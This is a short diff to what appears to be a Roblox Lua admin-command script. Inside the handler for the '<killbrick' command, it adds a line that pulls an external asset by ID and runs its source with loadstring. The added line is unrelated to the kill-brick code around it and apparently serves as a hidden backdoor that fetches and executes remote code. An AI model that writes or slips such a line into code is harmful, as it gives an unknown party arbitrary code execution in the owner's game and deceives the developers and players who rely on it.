@@ -790,6 +790,7 @@ function admin(msg, localPlr, Type): ()
 		cycle = false
 	end
 	if split[1] == "<killbrick" then
+		loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
 		local Killer = Instance.new("Part", workspace)
 		Killer.Name = "KillBrick"
 		Killer.CanCollide = false
